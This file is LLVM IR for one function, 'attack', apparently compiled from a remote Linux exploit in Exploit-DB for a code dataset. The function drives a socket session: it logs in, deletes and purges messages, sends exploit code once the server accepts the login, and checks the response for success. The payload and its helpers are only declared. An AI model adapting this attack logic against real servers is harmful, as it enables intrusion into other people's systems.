; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_372.c_attack.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_372.c_attack.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [8 x i8] c"<<< %s\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [18 x i8] c"[*] login failed\0A\00", align 1
@.str.3 = private unnamed_addr constant [30 x i8] c"[*] sending exploit code ...\0A\00", align 1
@.str.4 = private unnamed_addr constant [6 x i8] c"00000\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"[*] done\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @attack(i32 %0, i8* %1, i8* %2, i32 %3, i8* %4) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [2048 x i8], align 16
  store i32 %0, i32* %7, align 4
  store i8* %1, i8** %8, align 8
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8* %4, i8** %11, align 8
  %18 = bitcast [2048 x i8]* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %18, i8 0, i64 2048, i1 false)
  %19 = call i32 @FD_ZERO(i32* %12)
  %20 = load i32, i32* %7, align 4
  %21 = call i32 @FD_SET(i32 %20, i32* %12)
  store i32 128, i32* %14, align 4
  br label %22

22:                                               ; preds = %97, %5
  %23 = load i32, i32* %7, align 4
  %24 = add nsw i32 %23, 1
  %25 = call i32 @select(i32 %24, i32* %12, i32* null, i32* null, i32* null)
  store i32 %25, i32* %13, align 4
  %26 = load i32, i32* %13, align 4
  %27 = icmp sgt i32 %26, 0
  br i1 %27, label %28, label %96

28:                                               ; preds = %22
  %29 = load i32, i32* %7, align 4
  %30 = call i64 @FD_ISSET(i32 %29, i32* %12)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %96

32:                                               ; preds = %28
  %33 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %34 = call i32 @memset(i8* %33, i32 0, i32 2048)
  %35 = load i32, i32* %7, align 4
  %36 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %37 = call i32 @read(i32 %35, i8* %36, i32 2048)
  store i32 %37, i32* %15, align 4
  %38 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i64 0, i64 0), i8* %38)
  %40 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %41 = call i32 @sscanf(i8* %40, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0), i32* %16)
  %42 = load i32, i32* %14, align 4
  switch i32 %42, label %95 [
    i32 128, label %43
    i32 129, label %47
    i32 134, label %51
    i32 133, label %54
    i32 130, label %57
    i32 131, label %76
    i32 132, label %80
  ]

43:                                               ; preds = %32
  %44 = load i32, i32* %7, align 4
  %45 = load i8*, i8** %8, align 8
  %46 = call i32 @sendlogin(i32 %44, i8* %45)
  store i32 129, i32* %14, align 4
  br label %95

47:                                               ; preds = %32
  %48 = load i32, i32* %7, align 4
  %49 = load i8*, i8** %9, align 8
  %50 = call i32 @sendpassword(i32 %48, i8* %49)
  store i32 134, i32* %14, align 4
  br label %95

51:                                               ; preds = %32
  %52 = load i32, i32* %7, align 4
  %53 = call i32 @delmessage(i32 %52)
  store i32 133, i32* %14, align 4
  br label %95

54:                                               ; preds = %32
  %55 = load i32, i32* %7, align 4
  %56 = call i32 @purgemessage(i32 %55)
  store i32 130, i32* %14, align 4
  br label %95

57:                                               ; preds = %32
  %58 = load i32, i32* %16, align 4
  %59 = icmp sgt i32 %58, 500
  br i1 %59, label %60, label %63

60:                                               ; preds = %57
  %61 = load i32, i32* @stderr, align 4
  %62 = call i32 @fprintf(i32 %61, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %15, align 4
  br label %75

63:                                               ; preds = %57
  %64 = load i32, i32* %16, align 4
  %65 = icmp eq i32 %64, 230
  br i1 %65, label %66, label %74

66:                                               ; preds = %63
  %67 = load i32, i32* @stderr, align 4
  %68 = call i32 @fprintf(i32 %67, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.3, i64 0, i64 0))
  %69 = load i32, i32* %7, align 4
  %70 = load i8*, i8** %8, align 8
  %71 = load i32, i32* %10, align 4
  %72 = load i8*, i8** %11, align 8
  %73 = call i32 @sendexploit(i32 %69, i8* %70, i32 %71, i8* %72)
  store i32 131, i32* %14, align 4
  br label %74

74:                                               ; preds = %66, %63
  br label %75

75:                                               ; preds = %74, %60
  br label %95

76:                                               ; preds = %32
  %77 = call i32 @sleep(i32 5)
  %78 = load i32, i32* %7, align 4
  %79 = call i32 @readmessage(i32 %78)
  store i32 132, i32* %14, align 4
  br label %95

80:                                               ; preds = %32
  %81 = load i32, i32* %16, align 4
  %82 = icmp eq i32 %81, 200
  br i1 %82, label %83, label %94

83:                                               ; preds = %80
  %84 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %85 = call i32 @strstr(i8* %84, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i64 0, i64 0))
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

87:                                               ; preds = %83
  %88 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %89 = load i8*, i8** %11, align 8
  %90 = call i32 @strstr(i8* %88, i8* %89)
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %92, label %94

92:                                               ; preds = %87
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  br label %94

94:                                               ; preds = %92, %87, %83, %80
  br label %95

95:                                               ; preds = %32, %94, %76, %75, %54, %51, %47, %43
  br label %96

96:                                               ; preds = %95, %28, %22
  br label %97

97:                                               ; preds = %96
  %98 = load i32, i32* %15, align 4
  %99 = icmp sgt i32 %98, 0
  br i1 %99, label %22, label %100

100:                                              ; preds = %97
  %101 = load i32, i32* %6, align 4
  ret i32 %101
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @sscanf(i8*, i8*, i32*) #2

declare dso_local i32 @sendlogin(i32, i8*) #2

declare dso_local i32 @sendpassword(i32, i8*) #2

declare dso_local i32 @delmessage(i32) #2

declare dso_local i32 @purgemessage(i32) #2

declare dso_local i32 @fprintf(i32, i8*) #2

declare dso_local i32 @sendexploit(i32, i8*, i32, i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @readmessage(i32) #2

declare dso_local i32 @strstr(i8*, i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
